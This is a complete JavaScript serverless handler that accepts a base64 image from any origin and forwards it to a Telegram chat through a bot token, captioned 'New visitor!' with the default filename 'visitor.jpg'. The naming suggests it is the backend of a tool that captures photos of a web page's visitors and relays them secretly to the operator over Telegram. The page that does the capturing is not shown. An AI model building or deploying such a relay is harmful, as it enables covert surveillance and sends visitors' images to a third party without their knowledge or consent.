export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  try {
    const { image, filename } = req.body || {};
    if (!image) return res.status(400).json({ error: "No image provided" });

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      return res.status(200).json({ status: "no_credentials" });
    }

    const base64Data = image.includes(",") ? image.split(",")[1] : image;
    const buffer = Buffer.from(base64Data, "base64");

    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", new Blob([buffer], { type: "image/jpeg" }), filename || "visitor.jpg");
    formData.append("caption", `New visitor! File: ${filename || "visitor.jpg"}`);

    const tgResponse = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: "POST",
      body: formData
    });

    if (!tgResponse.ok) {
      const errText = await tgResponse.text();
      console.error("Telegram error:", errText);
      return res.status(500).json({ error: "Telegram API failed" });
    }

    return res.status(200).json({ status: "sent" });
  } catch (err) {
    console.error("Handler error:", err);
    return res.status(500).json({ error: err.message });
  }
}
